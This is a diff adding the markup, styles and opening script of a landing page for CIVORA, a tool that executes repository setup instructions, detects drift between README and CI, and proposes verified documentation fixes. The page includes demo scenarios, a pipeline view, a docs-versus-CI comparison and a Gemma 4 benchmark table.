+.note-facts{margin:23px 0 0;border-top:1px solid rgba(255,255,255,.12)}
+.note-facts div{padding:16px 0 0}
+.note-facts dt{margin-bottom:6px;font-family:var(--font-mono-text);font-size:9px;font-weight:500;line-height:1.2;letter-spacing:.06em;color:rgba(255,255,255,.48)}
+.note-facts dd{margin:0;font-size:13px;line-height:1.6;font-weight:400;color:rgba(255,255,255,.8)}
+.note-bottom{padding:0 28px 23px}
+.note-disclosure{margin:0 0 20px;padding-left:11px;border-left:2px solid rgba(0,113,255,.65);font-family:var(--font-mono-text);font-size:9px;line-height:1.5;font-weight:400;color:rgba(255,255,255,.45)}
+.note-navigation{display:flex;align-items:center;justify-content:space-between;gap:12px;padding-top:17px;border-top:1px solid rgba(255,255,255,.12)}
+.note-step{display:flex;align-items:center;justify-content:center;gap:8px;min-height:44px;padding:0 12px;border:1px solid rgba(255,255,255,.23);border-radius:6px;background:rgba(255,255,255,.025);color:white;font-family:var(--font-mono-text);font-size:10px;font-weight:500;transition:border-color .18s ease,background .18s ease}
+.note-step svg{width:12px;height:12px;fill:none;stroke:currentColor;stroke-width:1.4;stroke-linecap:round;stroke-linejoin:round;transition:transform .18s ease}
+.note-step:hover{border-color:#4DA3FF;background:rgba(0,113,255,.12)}
+.note-step.next:hover svg{transform:translateX(2px)}
+.note-step.prev:hover svg{transform:translateX(-2px)}
+.note-count{font-family:var(--font-mono-text);font-size:10px;font-weight:400;color:rgba(255,255,255,.45);white-space:nowrap}
+@media(max-width:519px){
+.pill{position:relative;inset:auto}
+.pill::before{inset:-12px 0}
+.hud .hit-area{r:38px}
+.annot{min-height:24px}
+#placeNotes{inset:auto 10px max(10px,env(safe-area-inset-bottom));margin:0;width:auto;max-width:none;max-height:calc(100dvh - max(24px,env(safe-area-inset-top)) - 20px);border-radius:16px;transform:translateY(14px)}
+#placeNotes.is-open{transform:none}
+#placeNotes.is-closing{transform:translateY(10px)}
+.note-top{padding-left:23px}.note-copy{padding:23px 23px 20px}.note-bottom{padding:0 23px 19px}
+#placeNotes h2{font-size:37px}.note-deck{font-size:16px;margin-bottom:17px}.note-facts{margin-top:19px}
+}
+@media(max-height:560px){#placeNotes{inset:12px 16px 12px auto;max-height:calc(100dvh - 24px)}.note-copy{padding-top:20px}.note-top{position:sticky;top:0;z-index:2;background:rgba(4,9,23,.98)}}
+
+@media (prefers-reduced-motion:reduce){
+*,*::before,*::after{animation:none!important;transition:none!important;scroll-behavior:auto!important}
+.headline span{transform:none}.ghost{display:none}.pin::after{display:none}
+}
+
+/* CIVORA Modal Dialogs & Engineering Panels */
+.full-modal {
+  position: fixed;
+  inset: 0;
+  width: 100vw;
+  height: 100vh;
+  max-width: 100vw;
+  max-height: 100vh;
+  background: rgba(1, 3, 15, 0.98);
+  border: 0;
+  padding: 0;
+  color: white;
+  z-index: 99999;
+  display: flex;
+  flex-direction: column;
+  backdrop-filter: blur(20px);
+  overflow: hidden;
+}
+.full-modal:not([open]) {
+  display: none;
+}
+.modal-header {
+  height: 64px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  padding: 0 24px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: rgba(4, 9, 23, 0.9);
+  flex-shrink: 0;
+}
+.modal-close {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 14px;
+  border: 1px solid rgba(255, 255, 255, 0.15);
+  border-radius: 6px;
+  background: rgba(255, 255, 255, 0.05);
+  color: rgba(255, 255, 255, 0.85);
+  font-family: var(--font-mono);
+  font-size: 11px;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+.modal-close:hover {
+  background: rgba(255, 255, 255, 0.1);
+  border-color: rgba(255, 255, 255, 0.3);
+  color: white;
+}
+.modal-body {
+  flex: 1;
+  overflow-y: auto;
+  padding: 24px;
+}
+.run-mission-btn {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  width: 100%;
+  margin-top: 20px;
+  padding: 12px 18px;
+  background: var(--blue);
+  color: white;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 0.06em;
+  border-radius: 6px;
+  border: 0;
+  cursor: pointer;
+  transition: background 0.2s, box-shadow 0.2s;
+  box-shadow: 0 0 16px rgba(0, 113, 255, 0.4);
+}
+.run-mission-btn:hover {
+  background: #38BDF8;
+  box-shadow: 0 0 24px rgba(0, 113, 255, 0.7);
+}
+
+
+/* Extra styles for Mission Control modal within the reference theme */
+.scenario-btn {
+  display: block;
+  width: 100%;
+  text-align: left;
+  padding: 12px 14px;
+  background: rgba(255, 255, 255, 0.03);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 8px;
+  margin-bottom: 8px;
+  color: white;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+.scenario-btn:hover {
+  background: rgba(255, 255, 255, 0.08);
+  border-color: rgba(255, 255, 255, 0.25);
+}
+.scenario-btn.active {
+  background: rgba(0, 113, 255, 0.15);
+  border-color: #0071FF;
+  box-shadow: 0 0 15px rgba(0, 113, 255, 0.25);
+}
+.pipeline-step {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 8px 12px;
+  background: rgba(255, 255, 255, 0.02);
+  border: 1px solid rgba(255, 255, 255, 0.06);
+  border-radius: 6px;
+  margin-bottom: 6px;
+  font-size: 12px;
+}
+.step-badge {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  color: rgba(255, 255, 255, 0.4);
+}
+.step-badge.verified {
+  color: #10B981;
+  font-weight: 600;
+}
+.step-badge.blocked {
+  color: #EF4444;
+  font-weight: 600;
+}
+.step-badge.suppressed {
+  color: #F59E0B;
+  font-weight: 600;
+}
+</style>
+</head>
+<body>
+<main class="frame" id="frame" aria-label="CIVORA cinematic developer infrastructure experience">
+  <img class="plate poster" src="/assets/civora-hero-plate.webp" width="1920" height="1080" alt="" fetchpriority="high" aria-hidden="true">
+  <video class="plate film" id="film" muted playsinline preload="auto" disablepictureinpicture disableremoteplayback aria-hidden="true" tabindex="-1"></video>
+  <div class="veil veil-v" id="veilV"></div>
+  <div class="veil veil-e" id="veilE"></div>
+  <div class="scenes">
+    <section class="scene vision" id="vision" aria-label="The CIVORA Method" aria-hidden="true">
+      <div class="tag">THE CIVORA METHOD</div>
+      <h2><i><span>From Broken Setup</span></i><i><span>Instructions to</span></i><i><span>Verified Contribution</span></i></h2>
+      <p>CIVORA follows the exact setup path a new developer would. It compares repository documentation against CI configuration, tests possible interventions, applies minimal verified edits and executes the repaired instructions again from a clean environment.</p>
+    </section>
+    <section class="scene eco" id="eco" aria-label="Verified Contributor Onboarding" aria-hidden="true">
+      <div class="eco-top">
+        <div class="eco-label">EXECUTION-BACKED,<br>DOCUMENTATION REPAIR<br>SECURITY-VERIFIED</div>
+        <h2>CIVORA connects repository instructions, CI evidence and isolated execution—so every documentation repair is proven before it reaches a contributor.</h2>
+      </div>
+      <div id="spots">
+        <button type="button" class="spot" style="--x:31.1%;--y:50.5%;--mx:8%;--my:57%" data-place="0" aria-label="Read about Isolated Sandbox execution" aria-haspopup="dialog" aria-controls="placeNotes" aria-expanded="false" disabled><span class="pin"><svg viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="1.4"/><circle cx="8" cy="3" r="1.4"/><circle cx="3" cy="8" r="1.4"/><circle cx="13" cy="8" r="1.4"/><circle cx="8" cy="13" r="1.4"/></svg></span><span class="cap">SANDBOX<br>EXECUTES REAL<br>SETUP STEPS</span></button>
+        <button type="button" class="spot" style="--x:76.45%;--y:50.5%;--mx:54%;--my:65%" data-place="1" aria-label="Read about CI Drift Radar" aria-haspopup="dialog" aria-controls="placeNotes" aria-expanded="false" disabled><span class="pin"><svg viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="1.4"/><circle cx="8" cy="3" r="1.4"/><circle cx="3" cy="8" r="1.4"/><circle cx="13" cy="8" r="1.4"/><circle cx="8" cy="13" r="1.4"/></svg></span><span class="cap">DRIFT RADAR<br>FINDS DOCS VS CI<br>MISMATCH</span></button>
+        <button type="button" class="spot" style="--x:5.5%;--y:73.3%;--mx:10%;--my:76%" data-place="2" aria-label="Read about Counterfactual Proof Engine" aria-haspopup="dialog" aria-controls="placeNotes" aria-expanded="false" disabled><span class="pin"><svg viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="1.4"/><circle cx="8" cy="3" r="1.4"/><circle cx="3" cy="8" r="1.4"/><circle cx="13" cy="8" r="1.4"/><circle cx="8" cy="13" r="1.4"/></svg></span><span class="cap">PROOF ENGINE<br>TESTS FIXES BEFORE<br>PATCHING</span></button>
+        <button type="button" class="spot" style="--x:61.65%;--y:80.1%;--mx:50%;--my:87%" data-place="3" aria-label="Read about Zero-Trust Provenance Gate" aria-haspopup="dialog" aria-controls="placeNotes" aria-expanded="false" disabled><span class="pin"><svg viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="1.4"/><circle cx="8" cy="3" r="1.4"/><circle cx="3" cy="8" r="1.4"/><circle cx="13" cy="8" r="1.4"/><circle cx="8" cy="13" r="1.4"/></svg></span><span class="cap">ZERO-TRUST<br>BLOCKS UNVERIFIED<br>COMMANDS</span></button>
+      </div>
+    </section>
+  </div>
+  <div class="stage" id="stage">
+    <header class="bar">
+      <a class="brand" href="#studio" data-progress="0" aria-label="CIVORA — return to opening">
+        <svg class="mark" viewBox="0 0 32 38" aria-hidden="true"><path d="M16 1 31 9.5v18.8L16 37 1 28.3V9.5ZM1 9.5 16 18l15-8.5M16 18v19M8.5 5.3 23.5 14v18.5M23.5 5.3 8.5 14v18.5M1 19l15 8.5L31 19M1 28.3 23.5 14M31 28.3 8.5 14"/><ellipse cx="16" cy="28" rx="9" ry="5.1"/><ellipse cx="16" cy="28" rx="6" ry="3.4"/><ellipse cx="16" cy="28" rx="3" ry="1.7"/></svg>
+        <span class="wordmark">CIVORA</span>
+      </a>
+      <nav class="nav" aria-label="Primary">
+        <a href="#vision" data-progress=".34">HOW IT WORKS<svg class="chev" viewBox="0 0 10 6" aria-hidden="true"><path d="M1 1 5 5 9 1"/></svg></a>
+        <a href="#eco" data-progress=".96">VERIFICATION<svg class="chev" viewBox="0 0 10 6" aria-hidden="true"><path d="M1 1 5 5 9 1"/></svg></a>
+        <a href="#studio" data-progress="0">OVERVIEW</a>
+        <a href="#benchmark" id="navBenchmark">BENCHMARK<svg class="chev" viewBox="0 0 10 6" aria-hidden="true"><path d="M1 1 5 5 9 1"/></svg></a>
+      </nav>
+      <a class="navcta" href="#workspace" id="btnOpenWorkspace">OPEN WORKSPACE<span class="square"><svg viewBox="0 0 13 13" aria-hidden="true"><path d="M2 11 11 2M2 2h9v9"/></svg></span></a>
+      <button type="button" class="burger" id="burger" aria-controls="mnav" aria-expanded="false" aria-label="Open navigation"><span></span><span></span><span></span></button>
+    </header>
+    <div class="body" id="studio">
+      <h1 class="headline"><i><span>Every Repository</span></i><i><span>Deserves a</span></i><i><span>Working First Run</span></i></h1>
+      <a class="cta" href="#vision" data-progress=".34"><span class="cta-label">EXPLORE THE ENGINE</span><span class="square"><svg viewBox="0 0 13 13" aria-hidden="true"><path d="M2 11 11 2M2 2h9v9"/></svg></span></a>
+    </div>
+    <div class="hudgroup">
+      <button type="button" class="pill" data-place="0" aria-label="Inspect repository structure" aria-haspopup="dialog" aria-controls="placeNotes" aria-expanded="false"><span>REPOSITORY</span></button>
+      <svg class="hud" viewBox="0 0 1280 720" role="group" aria-label="Repository architecture survey instrument">
+        <defs><filter id="node-glow" x="-120%" y="-120%" width="340%" height="340%"><feGaussianBlur stdDeviation="2.2"/></filter></defs>
+        <g class="axes" aria-hidden="true"><path class="dashed" d="M762.5 374V452M731 406.5H857M731 391.5h17M731 396.5h21M731 402.5h17"/><path class="solid" d="M731 388.5h15M731 390h12M731 392h15M731 393.5h10M731 395h15"/></g>
+        <g class="node-hit" role="button" tabindex="0" data-place="0" aria-label="Inspect repository structure" aria-haspopup="dialog" aria-controls="placeNotes" aria-expanded="false"><circle class="hit-area" cx="762.5" cy="406.5" r="22" fill="transparent"/><circle class="node-focus" cx="762.5" cy="406.5" r="12"/><g class="node"><circle cx="762.5" cy="406.5" r="7.6" fill="#0071FF" filter="url(#node-glow)"/><circle cx="762.5" cy="406.5" r="5.6" fill="#0071FF"/><circle cx="762.5" cy="406.5" r="2" fill="#EAF3FF"/></g></g>
+        <g class="marks" aria-hidden="true"><circle class="ring" cx="800" cy="418" r="4.5"/><circle class="dot" cx="800" cy="418" r="1.3"/><ellipse class="ring" cx="814" cy="418" rx="4" ry="2.7"/><circle class="dot" cx="814" cy="418" r="1.1"/><path class="ring" d="M825 417a6 6 0 0 1 12 0M827 428a4 4 0 0 1 8 0"/><circle class="ring" cx="831" cy="426" r="2.1"/><path class="arrow" d="m827 436 4-5 4 5ZM762.5 451v10m-3.4-3.5 3.4 3.5 3.4-3.5M759 452h7"/><path class="plus" d="M750.5 459v11M745 464.5h11"/></g>
+      </svg>
+      <div class="ghost" aria-hidden="true">ST<br>&amp;</div>
+      <button type="button" class="annot" data-place="0" aria-label="Read structure and dependencies specification" aria-haspopup="dialog" aria-controls="placeNotes" aria-expanded="false"><span>STRUCTURE</span><span>&amp; DEPENDENCIES</span></button>
+    </div>
+    <div class="foot">
+      <p class="sub"><b>Make every repository ready for its next contributor.</b>CIVORA executes setup instructions, discovers hidden blockers,<br> proves the correct fixes, and repairs documentation<br> before a new developer hits a dead end.</p>
+      <div class="scroll"><svg class="scroll-mark" viewBox="0 0 32 38" aria-hidden="true"><path d="M16 1 31 9.5v18.8L16 37 1 28.3V9.5ZM1 9.5 16 18l15-8.5M16 18v19M8.5 5.3 23.5 14v18.5M23.5 5.3 8.5 14v18.5M1 19l15 8.5L31 19M1 28.3 23.5 14M31 28.3 8.5 14"/><ellipse cx="16" cy="28" rx="9" ry="5.1"/><ellipse cx="16" cy="28" rx="6" ry="3.4"/><ellipse cx="16" cy="28" rx="3" ry="1.7"/></svg><span>Scroll to explore</span></div>
+    </div>
+    <nav class="mnav" id="mnav" aria-label="Mobile primary" aria-hidden="true" inert>
+      <a href="#vision" data-progress=".34" tabindex="-1">HOW IT WORKS</a>
+      <a href="#eco" data-progress=".96" tabindex="-1">VERIFICATION</a>
+      <a href="#studio" data-progress="0" tabindex="-1">OVERVIEW</a>
+      <a href="#benchmark" class="open-benchmark-trigger" tabindex="-1">BENCHMARK</a>
+      <a class="mobile-cta open-workspace-trigger" href="#workspace" tabindex="-1">OPEN WORKSPACE<span class="square"><svg viewBox="0 0 13 13" aria-hidden="true"><path d="M2 11 11 2M2 2h9v9"/></svg></span></a>
+    </nav>
+  </div>
+</main>
+<div class="track" aria-hidden="true"></div>
+
+<!-- Field Notes / Detail Panel Dialog -->
+<dialog id="placeNotes" aria-labelledby="place-title" aria-describedby="place-disclosure">
+  <div class="note-top"><span class="note-eyebrow">CIVORA / SYSTEM NOTES</span><button type="button" class="note-close" id="closePlace" aria-label="Close note"><svg viewBox="0 0 16 16" aria-hidden="true"><path d="m3 3 10 10M13 3 3 13"/></svg></button></div>
+  <div class="note-copy" id="placeCopy" aria-live="polite" aria-atomic="true">
+    <span class="note-kind" id="place-kind"></span>
+    <h2 id="place-title"></h2>
+    <p class="note-deck" id="place-deck"></p>
+    <p class="note-history" id="place-history"></p>
+    <dl class="note-facts"><div><dt>ENGINEERING CAPABILITY</dt><dd id="place-detail"></dd></div><div><dt>VERIFIED OUTCOME</dt><dd id="place-question"></dd></div></dl>
+  </div>
+  <div class="note-bottom">
+    <button type="button" class="run-mission-btn open-workspace-trigger">RUN IN MISSION CONTROL ↗</button>
+    <nav class="note-navigation" aria-label="Explore notes" style="margin-top:14px;"><button type="button" class="note-step prev" id="previousPlace"><svg viewBox="0 0 12 12" aria-hidden="true"><path d="M10 6H2m4-4L2 6l4 4"/></svg>PREVIOUS</button><span class="note-count" id="place-count"></span><button type="button" class="note-step next" id="nextPlace">NEXT NOTE<svg viewBox="0 0 12 12" aria-hidden="true"><path d="M2 6h8M6 2l4 4-4 4"/></svg></button></nav>
+  </div>
+</dialog>
+
+<!-- CIVORA Mission Control Modal -->
+<dialog id="workspaceModal" class="full-modal" aria-labelledby="ws-title">
+  <div class="modal-header">
+    <div style="display:flex;align-items:center;gap:14px;">
+      <span style="font-family:var(--font-mark);font-weight:600;font-size:18px;letter-spacing:.1em;">CIVORA</span>
+      <span style="font-family:var(--font-mono);font-size:10px;padding:3px 8px;border-radius:4px;background:rgba(0,113,255,.15);border:1px solid rgba(0,113,255,.3);color:#38BDF8;">MISSION CONTROL v1.0</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:12px;">
+      <button type="button" class="modal-close open-radar-trigger">CI-VS-DOCS RADAR</button>
+      <button type="button" class="modal-close open-benchmark-trigger">GEMMA 4 BENCHMARK</button>
+      <button type="button" class="modal-close" id="closeWorkspace">CLOSE [ESC]</button>
+    </div>
+  </div>
+  <div class="modal-body" style="display:grid;grid-template-columns:360px 1fr;gap:24px;">
+    <!-- Left Column: Scenarios & Pipeline -->
+    <div>
+      <div style="font-family:var(--font-mono);font-size:11px;color:#38BDF8;letter-spacing:.08em;margin-bottom:12px;font-weight:600;">EVALUATION SCENARIOS</div>
+      <button type="button" class="scenario-btn active" data-scenario="pulse-api" data-repo="civora-evals/pulse-api">
+        <div style="display:flex;justify-content:space-between;font-weight:600;font-size:13px;">Pulse API <span style="font-family:var(--font-mono);font-size:10px;opacity:.7;">Node.js / Express</span></div>
+        <div style="font-size:11px;opacity:.7;margin-top:4px;">Node 18 vs Node 20 drift + missing .env.example copy step.</div>
+      </button>
+      <button type="button" class="scenario-btn" data-scenario="vector-ingest" data-repo="civora-evals/vector-ingest">
+        <div style="display:flex;justify-content:space-between;font-weight:600;font-size:13px;">Vector Ingest <span style="font-family:var(--font-mono);font-size:10px;opacity:.7;">Python / FastAPI</span></div>
+        <div style="font-size:11px;opacity:.7;margin-top:4px;">pip documented vs Poetry lockfile + missing editable install.</div>
+      </button>
+      <button type="button" class="scenario-btn" data-scenario="red-team" data-repo="civora-evals/poisoned-repo">
+        <div style="display:flex;justify-content:space-between;font-weight:600;font-size:13px;">Red-Team Injection <span style="font-family:var(--font-mono);font-size:10px;opacity:.7;">Security / Adversarial</span></div>
+        <div style="font-size:11px;opacity:.7;margin-top:4px;">Malicious shell command injected into terminal output.</div>
+      </button>
+      <button type="button" class="scenario-btn" data-scenario="clean-cli" data-repo="civora-evals/clean-cli">
+        <div style="display:flex;justify-content:space-between;font-weight:600;font-size:13px;">Clean CLI <span style="font-family:var(--font-mono);font-size:10px;opacity:.7;">Python / CLI Tool</span></div>
+        <div style="font-size:11px;opacity:.7;margin-top:4px;">Actual source-code SyntaxError; suppresses unnecessary PR.</div>
+      </button>
+
+      <div style="margin-top:20px;padding-top:16px;border-top:1px solid rgba(255,255,255,.1);">
+        <div style="font-family:var(--font-mono);font-size:11px;color:rgba(255,255,255,.6);margin-bottom:10px;">Target: <span id="targetRepoText" style="color:white;font-weight:600;">civora-evals/pulse-api</span></div>
+        <button type="button" id="btnRunEngine" style="width:100%;padding:12px;background:var(--blue);color:white;font-family:var(--font-mono);font-size:12px;font-weight:600;border:0;border-radius:6px;cursor:pointer;box-shadow:0 0 16px rgba(0,113,255,.4);">RUN REPAIR ENGINE ↗</button>
+      </div>
+
+      <div style="margin-top:24px;">
+        <div style="font-family:var(--font-mono);font-size:11px;color:#38BDF8;letter-spacing:.08em;margin-bottom:12px;font-weight:600;">SEVEN-STAGE PIPELINE</div>
+        <div class="pipeline-step" id="step-1"><span>01 / Doc Extraction & Drift</span><span class="step-badge">PENDING</span></div>
+        <div class="pipeline-step" id="step-2"><span>02 / Isolated Docker Sandbox</span><span class="step-badge">PENDING</span></div>
+        <div class="pipeline-step" id="step-3"><span>03 / Counterfactual Proof</span><span class="step-badge">PENDING</span></div>
+        <div class="pipeline-step" id="step-4"><span>04 / Log Condensation</span><span class="step-badge">PENDING</span></div>
+        <div class="pipeline-step" id="step-5"><span>05 / Gemma 4 Reasoner</span><span class="step-badge">PENDING</span></div>
+        <div class="pipeline-step" id="step-6"><span>06 / Zero-Trust Gate</span><span class="step-badge">PENDING</span></div>
+        <div class="pipeline-step" id="step-7"><span>07 / Clean Re-Verification & PR</span><span class="step-badge">PENDING</span></div>
+      </div>
+    </div>
+
+    <!-- Right Column: Terminal Logs & Verification Status -->
+    <div style="display:flex;flex-direction:column;gap:16px;">
+      <!-- Terminal Window -->
+      <div style="background:#01030F;border:1px solid rgba(255,255,255,.12);border-radius:10px;overflow:hidden;height:360px;display:flex;flex-direction:column;">
+        <div style="height:34px;background:rgba(4,9,23,.95);border-bottom:1px solid rgba(255,255,255,.1);padding:0 14px;display:flex;align-items:center;justify-content:space-between;">
+          <div style="display:flex;align-items:center;gap:6px;">
+            <div style="width:10px;height:10px;border-radius:50%;background:#EF4444;"></div>
+            <div style="width:10px;height:10px;border-radius:50%;background:#F59E0B;"></div>
+            <div style="width:10px;height:10px;border-radius:50%;background:#10B981;"></div>
+            <span style="font-family:var(--font-mono);font-size:11px;opacity:.6;margin-left:8px;">sandbox-pty-session // debian:bookworm-slim</span>
+          </div>
+          <span style="font-family:var(--font-mono);font-size:10px;color:#10B981;">● ACTIVE PTY</span>
+        </div>
+        <div id="terminalOutput" style="flex:1;padding:14px;font-family:var(--font-mono);font-size:12px;line-height:1.6;overflow-y:auto;color:rgba(255,255,255,.85);">
+          <div style="color:#38BDF8;">[ENGINE] CIVORA Engine ready. Select a scenario and click RUN REPAIR ENGINE.</div>
+        </div>
+      </div>
+
+      <!-- PR Status Card -->
+      <div id="prNotice" style="display:none;padding:16px;background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.3);border-radius:8px;font-family:var(--font-mono);font-size:12px;color:#A7F3D0;">
+        <div style="font-weight:600;margin-bottom:4px;">✓ GITHUB PULL REQUEST #14 CREATED (READY TO MERGE)</div>
+        <div style="font-size:11px;opacity:.85;">Includes minimal README line patch + synthesized .devcontainer/devcontainer.json + clean verification badge.</div>
+      </div>
+
+      <!-- Provenance Audit Summary -->
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
+        <div style="padding:14px;background:rgba(4,9,23,.8);border:1px solid rgba(255,255,255,.1);border-radius:8px;font-family:var(--font-mono);font-size:11px;">
+          <div style="color:#38BDF8;font-weight:600;margin-bottom:8px;">ZERO-TRUST PROVENANCE GATE</div>
+          <div style="opacity:.8;line-height:1.5;">Status: <span style="color:#10B981;">ARMED</span><br>Indirect Injection Defense: <span style="color:#10B981;">ACTIVE</span><br>Unverified Commands: <span style="color:#EF4444;">REJECTED</span></div>
+        </div>
+        <div style="padding:14px;background:rgba(4,9,23,.8);border:1px solid rgba(255,255,255,.1);border-radius:8px;font-family:var(--font-mono);font-size:11px;">
+          <div style="color:#38BDF8;font-weight:600;margin-bottom:8px;">GEMMA 4 REASONING ENGINE</div>
+          <div style="opacity:.8;line-height:1.5;">Model: Gemma 4 26B-A4B MoE<br>Decoding: xgrammar JSON Schema<br>Line-Targeting: AST Exact Match</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</dialog>
+
+<!-- CI-vs-Docs Drift Radar Modal -->
+<dialog id="radarModal" class="full-modal">
+  <div class="modal-header">
+    <div style="display:flex;align-items:center;gap:14px;">
+      <span style="font-family:var(--font-mark);font-weight:600;font-size:18px;">CIVORA</span>
+      <span style="font-family:var(--font-mono);font-size:10px;padding:3px 8px;border-radius:4px;background:rgba(56,189,248,.15);border:1px solid rgba(56,189,248,.3);color:#38BDF8;">CI-VS-DOCS DRIFT RADAR</span>
+    </div>
+    <button type="button" class="modal-close" id="closeRadar">CLOSE [ESC]</button>
+  </div>
+  <div class="modal-body" style="max-width:1100px;margin:0 auto;width:100%;">
+    <h2 style="font-family:var(--font-display);font-size:36px;margin:0 0 12px;">CI Drift Intelligence Matrix</h2>
+    <p style="font-size:14px;opacity:.75;margin:0 0 28px;">Discrepancies identified between human-facing instructions and machine-executable CI runners.</p>
+    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:20px;font-family:var(--font-mono);font-size:12px;">
+      <div style="background:rgba(4,9,23,.9);padding:16px;border:1px solid rgba(255,255,255,.1);border-radius:8px;">
+        <div style="color:#EF4444;font-weight:600;margin-bottom:10px;">01 // DOCUMENTED (README)</div>
+        <div style="opacity:.7;line-height:1.6;">$ nvm use 18 (Deprecated)<br>$ npm install<br>$ npm run dev<br><br><span style="color:#F59E0B;">⚠ Missing .env copy step</span></div>
+      </div>
+      <div style="background:rgba(4,9,23,.9);padding:16px;border:1px solid rgba(255,255,255,.1);border-radius:8px;">
+        <div style="color:#10B981;font-weight:600;margin-bottom:10px;">02 // MACHINE CI (ci.yml)</div>
+        <div style="opacity:.7;line-height:1.6;">node-version: 20<br>run: npm ci<br>run: cp .env.example .env<br>run: npm test<br><br><span style="color:#10B981;">✓ Passes on CI runner</span></div>
+      </div>
+      <div style="background:rgba(4,9,23,.9);padding:16px;border:1px solid rgba(255,255,255,.1);border-radius:8px;">
+        <div style="color:#38BDF8;font-weight:600;margin-bottom:10px;">03 // PROVEN PATCH</div>
+        <div style="opacity:.7;line-height:1.6;">+ $ nvm use 20<br>&nbsp;&nbsp;$ npm install<br>+ $ cp .env.example .env<br>&nbsp;&nbsp;$ npm run dev<br><br><span style="color:#38BDF8;">✓ Proven exit code 0</span></div>
+      </div>
+    </div>
+  </div>
+</dialog>
+
+<!-- Gemma 4 Benchmark Modal -->
+<dialog id="benchmarkModal" class="full-modal">
+  <div class="modal-header">
+    <div style="display:flex;align-items:center;gap:14px;">
+      <span style="font-family:var(--font-mark);font-weight:600;font-size:18px;">CIVORA</span>
+      <span style="font-family:var(--font-mono);font-size:10px;padding:3px 8px;border-radius:4px;background:rgba(168,85,247,.15);border:1px solid rgba(168,85,247,.3);color:#C084FC;">GEMMA 4 BENCHMARK SUITE</span>
+    </div>
+    <button type="button" class="modal-close" id="closeBenchmark">CLOSE [ESC]</button>
+  </div>
+  <div class="modal-body" style="max-width:1100px;margin:0 auto;width:100%;">
+    <h2 style="font-family:var(--font-display);font-size:36px;margin:0 0 12px;">Model Reasoning & Patch Precision</h2>
+    <p style="font-size:14px;opacity:.75;margin:0 0 28px;">Comparison of Google Gemma 4 models constrained with xgrammar JSON decoding against unconstrained baselines.</p>
+    <div style="background:rgba(4,9,23,.9);border:1px solid rgba(255,255,255,.1);border-radius:10px;overflow:hidden;font-family:var(--font-mono);font-size:12px;">
+      <table style="width:100%;border-collapse:collapse;text-align:left;">
+        <thead>
+          <tr style="background:rgba(255,255,255,.05);border-bottom:1px solid rgba(255,255,255,.1);font-size:11px;color:rgba(255,255,255,.5);">
+            <th style="padding:14px;">Model & Strategy</th>
+            <th style="padding:14px;">Defect Localization</th>
+            <th style="padding:14px;">Verified Patch Precision</th>
+            <th style="padding:14px;">Inference Latency</th>
+            <th style="padding:14px;">Re-Run Pass Rate</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr style="background:rgba(0,113,255,.05);border-bottom:1px solid rgba(255,255,255,.05);">
+            <td style="padding:14px;color:#38BDF8;font-weight:600;">Gemma 4 26B-A4B MoE (xgrammar JSON)</td>
+            <td style="padding:14px;color:#10B981;font-weight:600;">96.4%</td>
+            <td style="padding:14px;color:#10B981;font-weight:600;">98.2%</td>
+            <td style="padding:14px;">420ms</td>
+            <td style="padding:14px;color:#10B981;font-weight:600;">95.8%</td>
+          </tr>
+          <tr style="border-bottom:1px solid rgba(255,255,255,.05);">
+            <td style="padding:14px;color:white;font-weight:500;">Gemma 4 E4B (xgrammar JSON)</td>
+            <td style="padding:14px;">91.8%</td>
+            <td style="padding:14px;">94.5%</td>
+            <td style="padding:14px;color:#10B981;font-weight:600;">145ms</td>
+            <td style="padding:14px;">91.2%</td>
+          </tr>
+          <tr style="opacity:.6;">
+            <td style="padding:14px;">Unconstrained Baseline (Free-form Markdown)</td>
+            <td style="padding:14px;color:#F59E0B;">74.2%</td>
+            <td style="padding:14px;color:#EF4444;">58.1%</td>
+            <td style="padding:14px;">890ms</td>
+            <td style="padding:14px;color:#EF4444;">54.0%</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</dialog>
+
+<script>
+
+(function () {
+  'use strict';
+  var FILM_SRC = '/assets/civora-city-fabric-scrub.mp4';
+  var FILM_ORIGINAL = '/assets/civora-city-fabric-scrub.mp4';
+  var FILM_MAP = [[0,0],[.12,.25],[.47,.52],[.72,.78],[.92,1],[1,1]];
+  var STILLS = ['/assets/civora-hero-plate.webp','/assets/civora-vision-fallback.webp','/assets/civora-city-fallback.webp'];
+  var stage = document.getElementById('stage'), frame = stage.parentNode;
+  var film = document.getElementById('film'), spots = document.getElementById('spots');
+  var root = document.documentElement, rs = root.style, poster = frame.querySelector('img.plate');
+  var vision = document.getElementById('vision'), eco = document.getElementById('eco');
+  var veilV = document.getElementById('veilV'), veilE = document.getElementById('veilE');
+  var tag = vision.querySelector('.tag'), titleLines = vision.querySelectorAll('h2 span'), visionP = vision.querySelector('p');
+  var ecoTop = eco.querySelector('.eco-top'), pins = spots.querySelectorAll('.spot');
+  var burger = document.getElementById('burger'), mnav = document.getElementById('mnav'), menuLinks = mnav.querySelectorAll('a');
+  var dialog = document.getElementById('contact'), closeBrief = document.getElementById('closeBrief');
+  var reduceQuery = window.matchMedia('(prefers-reduced-motion: reduce)'), reduced = reduceQuery.matches;
+  var isFlow = false, baseX = 50, baseY = 50, menuOpen = false, restoreTrigger = null;
+  var ready = false, duration = 10, fallbackUsed = false, failed = false, blobURL = null, stillIndex = 0;
